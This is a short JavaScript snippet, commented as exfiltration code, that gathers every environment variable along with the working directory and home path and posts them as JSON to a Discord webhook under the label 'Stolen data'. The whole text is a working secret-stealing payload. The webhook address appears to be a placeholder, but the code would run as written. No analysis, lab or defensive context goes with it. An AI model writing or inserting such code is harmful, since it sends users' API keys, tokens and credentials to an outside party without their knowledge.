// Exfiltrates data via Discord webhook
const webhook = "https://discord.com/api/webhooks/1234567890/abcdefg";

// Steal environment variables
const secrets = {
    env: process.env,
    cwd: process.cwd(),
    home: process.env.HOME
};

fetch(webhook, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
        content: "Stolen data",
        embeds: [{ description: JSON.stringify(secrets) }]
    })
});
